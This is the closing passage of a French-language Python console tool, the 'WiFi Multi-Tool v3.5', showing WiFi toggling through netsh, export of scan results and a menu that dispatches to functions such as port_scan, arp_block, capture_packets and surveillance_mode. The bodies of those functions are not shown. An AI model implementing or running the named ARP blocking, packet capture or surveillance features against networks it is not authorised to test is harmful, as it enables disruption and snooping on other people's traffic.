            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n\n{info('Surveillance arretee.')}")
    pause()


# ══════════════════════════════════════════════════════════
#  17 & 18. WIFI ON/OFF
# ══════════════════════════════════════════════════════════
def wifi_toggle(enable: bool):
    action = "enabled" if enable else "disabled"
    label  = "ACTIVATION" if enable else "DESACTIVATION"
    print(title(label + " DU WIFI"))
    iface = get_wifi_iface()
    code, out = run(["netsh", "interface", "set", "interface", iface, action])
    if code == 0:
        print(ok(f"WiFi {'active' if enable else 'desactive'} ({iface})"))
    else:
        print(err("Echec. Lancez en Administrateur."))
        print(info(out.strip()[:120]))
    pause()


# ══════════════════════════════════════════════════════════
#  19. EXPORT
# ══════════════════════════════════════════════════════════
def export_results():
    global _last_networks
    print(title("EXPORT DES RESULTATS"))
    if not _last_networks:
        print(warn("Aucun scan effectue. Lancez d'abord l'option 01.")); pause(); return
    fmt = input(f"\n  {ACC}Format [{DIM}csv{ACC}/{DIM}txt{ACC}] : {RS}").strip().lower()
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    if fmt == "txt":
        fname = LOG_DIR / f"scan_{ts}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"WiFi Scan — By AKO — {datetime.now()}\n{'─'*50}\n\n")
            for n in _last_networks:
                for k, v in n.items():
                    f.write(f"{k:<12}: {v}\n")
                f.write("\n")
    else:
        fname = LOG_DIR / f"scan_{ts}.csv"
        keys  = ["ssid","bssid","signal","channel","auth","cipher"]
        with open(fname, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
            w.writeheader(); w.writerows(_last_networks)
    print(ok(f"Exporte -> {fname.resolve()}"))
    pause()


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════
ACTIONS = {
    "01": scan_networks,   "1":  scan_networks,
    "02": network_info,    "2":  network_info,
    "03": known_networks,  "3":  known_networks,
    "04": check_security,  "4":  check_security,
    "05": arp_scan,        "5":  arp_scan,
    "06": arp_block,       "6":  arp_block,
    "07": conn_history,    "7":  conn_history,
    "08": send_message,    "8":  send_message,
    "09": ip_lookup,       "9":  ip_lookup,
    "10": ping_test,
    "11": speed_test,
    "12": traceroute,
    "13": port_scan,
    "14": signal_monitor,
    "15": capture_packets,
    "16": surveillance_mode,
    "17": lambda: wifi_toggle(True),
    "18": lambda: wifi_toggle(False),
    "19": export_results,
}

def main():
    slow_banner()

    try:
        import ctypes
        is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        is_admin = False

    if not is_admin:
        print(warn("Non lance en Administrateur — options 05/06/15/17/18 limitees."))
    else:
        print(ok("Droits Administrateur detectes."))
    print(info(f"Logs -> {LOG_DIR.resolve()}"))

    while True:
        print(MENU)
        choice = input(f"  {BR}{PRI}> {RS}{ACC}Votre choix : {RS}").strip()
        clear_banner()

        if choice in ACTIONS:
            ACTIONS[choice]()
        elif choice in ("00", "0"):
            print(f"\n{BR}{PRI}  WiFi Multi-Tool v3.5 — By AKO{RS}")
            typewrite(f"{DIM}  A bientot !{RS}", delay=0.03)
            print(); sys.exit(0)
        else:
            print(warn("Choix invalide."))

if __name__ == "__main__":
    main()
